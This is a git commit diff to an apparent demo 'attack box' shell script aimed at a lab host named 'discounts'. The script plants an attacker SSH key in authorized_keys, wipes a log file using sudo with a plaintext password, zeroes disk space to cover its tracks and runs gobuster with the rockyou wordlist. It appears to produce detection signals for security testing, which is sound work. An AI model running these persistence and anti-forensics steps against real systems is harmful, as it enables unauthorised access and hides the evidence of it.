9fcb159ba7f1cc9e85d58547929a98586813b5ba
Colin Cole <colin.cole@datadoghq.com>
2021-08-27 18:13:56 -0400

    switch to kali, add gobuster cmd

--- attack-box/attack.sh
+++ attack-box/attack.sh
@@ -1,15 +1,5 @@
 #!/bin/bash
-echo "Starting Attack box..." && sleep 2
-
-# cat /home/test/.ssh/storedog-leaked-key.pub >> /home/test/.ssh/authorized_keys
-# ssh-copy-id -i /home/test/.ssh/storedog-leaked-key.pub test@discounts
-
-echo "attempt entering discounts..."
-
-ssh -o StrictHostKeyChecking=no test@discounts /bin/bash <<EOT
-touch i-attacked-u.txt
-exit
-EOT
+echo "Starting attackbox..."
 
 echo "attempt to copy attacker key to discounts...."
 scp -o StrictHostKeyChecking=no ./keys/attacker-key.pub test@discounts:/home/test/.ssh
@@ -20,23 +10,17 @@ cat /home/test/.ssh/attacker-key.pub >> /home/test/.ssh/authorized_keys
 exit
 EOT
 
-echo "attempt entering discounts with attacker key..."
-ssh -o StrictHostKeyChecking=no -i ./keys/attacker-key test@discounts /bin/bash <<EOT
-touch now-i-can-access-with-my-key-2.txt
-exit
-EOT
-
-# TODO - The log file should be switched to /var/log/secure
 echo "attempt to clear log file and zero out unallocated disk space"
 ssh -o StrictHostKeyChecking=no -i ./keys/attacker-key test@discounts /bin/bash <<EOT
-echo "test" | sudo -S cat /dev/null > /var/log/alternatives.log
+echo "test" | sudo -S cp /dev/null /var/log/alternatives.log
 echo "test" | sudo -S dd if=/dev/zero of=tempfile bs=1000000 count=10
 exit
 EOT
 
 if  [ "${DIRBUSTER}" = true ];
 then
-echo "I invoked DIRBUSTER"
+echo "I invoked gobuster!"
+./gobuster dir -u http://discounts:5001 -w /usr/share/wordlists/rockyou.txt
 fi
 
 if  [ "${BRUTEFORCE}" = true ];
